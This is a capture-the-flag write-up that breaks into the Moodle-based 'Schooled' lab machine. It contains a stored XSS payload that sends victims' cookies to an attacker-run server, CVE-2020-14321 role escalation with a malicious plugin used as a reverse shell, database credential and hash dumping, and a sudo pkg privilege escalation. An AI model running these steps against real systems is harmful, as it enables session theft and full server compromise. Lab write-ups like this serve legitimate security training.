# Schooled

export IP=10.10.10.234

# Solution

Starting with an nmap scan
```bash
cmd: sudo nmap -sC -sV -oN nmap/initial $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
```

Leaving an all port on the background <br>

From the nmap we can already see it is running **Apache** over **FreeBSD**. We can also see the PHP-version: **7.4.15** <br>

Navigating through the webpage (port 80) we can see some names in the testimonials and teachers
```
--- testimonials ---
James Fernando
Jacques Philips
Venanda Mercy

--- teachers ---
Jane Higgins
Lianne Carter
Manuel Phillips
Jamie Borham
```

Also found more information on the **Contact details**
```
admissions@schooled.htb
schooled.htb
PO Box 16122 Collins Street West Victoria 8007 Australia
+61 3 8376 6284
```

In **/contact.html** there's a form that redirects to **/contact.php** but returns a 404 and the request has nothing special at first glance <br>

The allports returned other port (i've encountered it prior) but might be nothing important
```bash
33060/tcp open  mysqlx? syn-ack ttl 63
| fingerprint-strings:                                                   
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessi
onReq, X11Probe, afp:               
|     Invalid message"                                                   
|     HY000                                                              
|   LDAPBindReq:                                                         
|     *Parse error unserializing protobuf message"
|     HY000                                                              
|   oracle-tns:                                                          
|     Invalid message-frame."                                            
|_    HY000
```

The webpage was not providing anything so i went ahead and did a vhost bruteforce which produced some results
```bash
Found: moodle.schooled.htb (Status: 200) [Size: 84]
```

Accessing it we have the moodle platform. We can create an account, lets do it
```bash
username: www
password: 123456wW-
email: www@student.schooled.htb

Restrictions: This email is not one of those that are allowed (student.schooled.htb) 
```

I did a gobuster bruteforce to see if there's any page of interest to found only one that could provide anything
```
/admin
```

This page, for the very first access (after i clicked the bottom menu it stopped showing this), displayed the version of the moodle platform and what php packages/filters are applied
```bash
Current release information
Moodle 3.9 (Build: 20200615)
```

Noticed that we could chat with the mathematics profressor but sending a XSS link did not provided any results. As a log, his email is: **phillips_manuel@staff.schooled.htb** <br>

After that i saw that we could enroll in the **mathematics** class and there were some **announcements**
```sql
ANNOUCEMENT 2

Reminder for joining students
by Manuel Phillips - Wednesday, 23 December 2020, 12:01 AM
Number of replies: 0

This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.

Students who do not set their MoodleNet profiles will be  removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.

Look forward to seeing you all soon.

Manuel Phillips

-------------------------------------------------------------------------
ANNOUCEMENT 1

Welcome to Mathematics
by Jamie Borham - Saturday, 19 December 2020, 1:12 PM
Number of replies: 0

We will commence studies on 7th January 2021. Please be aware that lectures will be delivered online on a week by week basis and content will be released on the day of study.
```

From the second annoucement we can see that we need to set the **MoodleNet** profile in the moodle's account profile. Testing it for a simple XSS gives positive results with the **alert(123)** being executed
```javascript
MoodleNet Field Link: <img src="1" onerror="alert(123)">
```

Now, we can try to **steal the professor cookies** with a link that requests to a simple python server
```javascript
MoodleNet Field Link: <img src="1" onerror="window.location='http://10.10.16.57/cookie='+document.cookie">
```

Now, just change the cookies in the browser and refresh, we are **logged in as Manuel Phillips** <br>

Searching for CVE's, the CVE2020-14321 was found (with the [PoC](https://github.com/HoangKien1020/CVE-2020-14321)) which gives us the RCE we need to get a shell ! <br>

For this PoC we need to add the manager role to other user and then we can **"log in"** as him/her. After doing that, we have access to the administration panel, where we can upload and install a malicious plugin that will give us RCE when the page is accessed <br>

During the PoC, we only have one interesting user although multiple are shown. The interesting one has a **@staf.schooled.htb** email address (Lianne Carter - carter_lianne@staff.schooled.htb), while the others have a **@student.schooled.htb**. <br> 

Since we need a manager account, this is the one which most probably has what we need. The plugin to RCE was changed to contain a reverse shell instead of executing a system command with the value passed in the GET request (ex: cmd=whoami) <br>

We're in !
```bash
cmd: whoami && id

www
uid=80(www) gid=80(www) groups=80(www)
```

Lets find stuff in the machine <br>
```bash
# Users and home folders (cant access any)
    cmd: ls /home
    jamie -> wheel group
    steve

# Apache directory
    cmd: find / -type f -name "*apache*" 2>/dev/null
    
    ---snip---
    /usr/local/www/apache24/

# Apache config
    cmd: cat config.php | less
    <?php  // Moodle configuration file

        unset($CFG);
        global $CFG;
        $CFG = new stdClass();

        $CFG->dbtype    = 'mysqli';
        $CFG->dblibrary = 'native';
        $CFG->dbhost    = 'localhost';
        $CFG->dbname    = 'moodle';
        $CFG->dbuser    = 'moodle';
        $CFG->dbpass    = 'PlaybookMaster2020';
        $CFG->prefix    = 'mdl_';
        $CFG->dboptions = array (
        'dbpersist' => 0,
            'dbport' => 3306,
            'dbsocket' => '',
                'dbcollation' => 'utf8_unicode_ci',
                );

# Finding mysql:
    cmd: find / -type f -name "*mysql*" 2>/dev/null
    /usr/local/bin/mysql

# Checking DB:
    cmd: /usr/local/bin/mysql -u moodle -p PlaybookMaster2020

    moodle@localhost [(none)]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | moodle             |
    +--------------------+
    2 rows in set (0.00 sec)

# DB enumeration for users that might have a home folder
    Jamie Borham id = 2
    James Heel 	 id = 7

# Got some hashes from mdl_user
    admin:$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
    heel_james89:$2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
    james_boris89:$2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq
```

The only cracked hash (with john and rockyou-75) is for the admin moodle account
```bash
!QAZ2wsx         (admin)
```

If we log in as admin we can see that the admin account belongs to **"Jamie Borham"** which, potentially, is the user that detains the home folder seen before. With **su jamie** or via ssh, we got the user account <br>
```bash
su jamie
Password: !QAZ2wsx

cmd: whoami && id
jamie
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)

cmd: cat ~/user.txt
FLAG: cd93220c86375fb577a23a6730162286
```

Tried to do **sudo -l** but sudo is not found by the PATH environment paths. Lets search for it
```
cmd: find / -type f -name "*sudo*" 2>/dev/null
/usr/local/bin/sudo

cmd: /usr/local/bin/sudo -l
User jamie may run the following commands on Schooled:                                           
    (ALL) NOPASSWD: /usr/sbin/pkg update                    
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

In the **gtfobins** page we have an entry for the pkg binary. We need to create a **freeBSD** package locally, upload it and install it in order to privesc to root
```bash
# LOCAL:

cmd: TF=$(mktemp -d)
cmd: echo 'id' > $TF/x.sh   # replace ID with a FreeBSD revshell
cmd: fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF

Note: Here i renamed the package to w.txz
-------------------------
# REMOTE
cmd: /usr/local/bin/sudo /usr/sbin/pkg install -y --no-repo-update w.txz
```

And, it's done
```bash
cmd: whoami && id
root                                                                       
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)

cmd: cat /root/root.txt
FLAG: 3b03f13b55a432de19f392d810bf6489
```